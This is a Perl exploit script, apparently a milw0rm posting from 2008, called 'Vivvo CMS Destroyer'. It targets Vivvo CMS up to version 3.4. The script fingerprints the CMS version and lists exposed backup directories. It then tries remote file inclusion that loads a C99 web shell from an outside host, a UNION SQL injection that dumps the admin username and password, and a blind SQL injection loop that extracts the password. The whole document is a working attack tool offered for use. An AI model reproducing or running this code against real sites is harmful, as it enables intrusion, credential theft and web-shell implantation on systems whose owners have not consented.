<html><head><title>Vivvo CMS <= 3.4 Multiple Vulnerabilities Destroyer Exploit</title></head><pre>#!/usr/bin/perl

#Vivvo CMS Destroyer
#uxmal666@gmail.com
#By Xianur0
#-------------CREDITS-------------
#http://milw0rm.com/exploits/4192
#http://milw0rm.com/exploits/3326
#http://milw0rm.com/exploits/2339
#http://milw0rm.com/exploits/2337
#-------------/CREDITS-------------

print &quot;\n                           Vivvo CMS Destroyer By Xianur0\n&quot;;

#-----------CONFIG----------
$SHELL='http://y4m15p33dy.vilabol.uol.com.br/c99.txt';
$textshell = 'C99Shell v.';
#----------/CONFIG----------
  use LWP::UserAgent;
  use Switch;
  my $path = $ARGV[0];
  $path = shift || &amp;uso;
sub uso { print &quot;\nUse: vivvo.pl [URI to Vivvo CMS]\n&quot;; exit;}
  $ua = LWP::UserAgent-&gt;new;
  $ua-&gt;agent(&quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17&quot;);
  $req = HTTP::Request-&gt;new(GET =&gt; $path.&quot;/feed.php?output_type=rss&quot;);
  $req-&gt;header('Accept' =&gt; 'text/javascript, text/html, application/xml, text/xml, */*');
  $res = $ua-&gt;request($req);
  if ($res-&gt;is_success &amp;&amp; $res-&gt;content =~ &quot;generator&quot;) {
&amp;parser($res-&gt;content);
  } else {
  $req = HTTP::Request-&gt;new(GET =&gt; $path.&quot;/index.php?feed&quot;);
  $req-&gt;header('Accept' =&gt; 'text/javascript, text/html, application/xml, text/xml, */*');
  $res = $ua-&gt;request($req);
  if ($res-&gt;is_success &amp;&amp; $res-&gt;content =~ &quot;generator&quot;) {
&amp;parser($res-&gt;content);
  }
    else { print &quot;\nError getting data!\n&quot;; exit;}
  }

&amp;backups;


sub parser {
my @datos = split('&lt;generator&gt;Vivvo CMS ', $_[0]);
my @version = split('&lt;/generator&gt;', $datos[1]);
$version = $version[0];
if($version[0] == &quot;&quot;) {
my @datos = split('&lt;meta name=&quot;generator&quot; content=&quot;Vivvo ', $_[0]);
my @version = split('&quot; /&gt;', $datos[1]);
$version = $version[0];
}
print &quot;Version: &quot;.$version.&quot;\n&quot;;
if($version &lt; &quot;4&quot;) { print &quot;Outdated version of Vivvo CMS!\n&quot;; &amp;desactualizada($version);}
}

sub backups {
  $req = HTTP::Request-&gt;new(GET =&gt; &quot;$path/backup&quot;);
  $req-&gt;header('Accept' =&gt; 'text/xml');
  $res = $ua-&gt;request($req);
  if ($res-&gt;is_success) {
if($res-&gt;content =~ &quot;&lt;title&gt;Index of /backup&lt;/title&gt;&quot;) {
print &quot;\n              Backups:\n&quot;;
my @datos = split('&lt;a href=&quot;', $res-&gt;content);
$datos[0] = &quot;&quot;;
foreach $archivos (@datos) {
my @archivo = split('&quot;&gt;', $archivos);
if($archivo[0] !~ /\?/){print $archivo[0].&quot;\n&quot;; }
}
print &quot;\nUnprotected Directory: $path/backup\n&quot;;
  }
}
}

sub rfi {
$vuln = $_[0];
  $req = HTTP::Request-&gt;new(GET =&gt; &quot;$path/$vuln=$SHELL?&quot;);
  $req-&gt;header('Accept' =&gt; 'text/xml');
  $res = $ua-&gt;request($req);
  if ($res-&gt;is_success) {
if($res-&gt;content =~ $textshell) {
print &quot;RFI Detected!: $path/$vuln=$SHELL?&quot;;
  }
}}

sub sql {
$exploit = &quot;pdf_version.php?id=-1%20UNION%20SELECT%201,2,3,password,5,6,username,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24%20FROM%20tblUsers%20where%20userid=1&quot;;
  $req = HTTP::Request-&gt;new(GET =&gt; &quot;$path/$exploit&quot;);
  $req-&gt;header('Accept' =&gt; 'text/xml');
  $res = $ua-&gt;request($req);
  if ($res-&gt;is_success) {
print &quot;SQL Injection Generated: $path$exploit&quot;;
}
}

sub blind {
for($i=1; $i&lt;32;$i++) {
for($o=30; $o&lt;102;$o++) {
$injection = &quot;$path/index.php?category=/**/AND/**/(ascii(substring((SELECT/**/password/**/FROM/**/tblUsers/**/WHERE/**/userid=1),&quot;.$i.&quot;,1))=&quot;.$o;
  $req = HTTP::Request-&gt;new(GET =&gt; $injection);
  $req-&gt;header('Accept' =&gt; 'text/xml');
  $res = $ua-&gt;request($req);
  if ($res-&gt;is_success) {
if($res-&gt;content != &quot;&quot;) {
print &quot;Blind Done Correctly!: $injection&quot;;
  }
}
}}}

sub desactualizada {
$version = $_[0];
  switch ($version) {
    case &quot;3.4&quot;    { print &quot;Blind SQL Injection trying ....\n&quot;; &amp;blind; print &quot;Intentando RFI....\n&quot;; &amp;rfi('include/db_conn.php?root');}
    case &quot;3.2&quot;    { print &quot;RFI trying ....\n&quot;; &amp;rfi('index.php?classified_path'); print &quot;SQL Injection....\n&quot;; &amp;sql;}
        else { print &quot;There is no registration for this Exploit Version! : (\n&quot;;}
    }
}

# milw0rm.com [2008-10-19]</pre></html>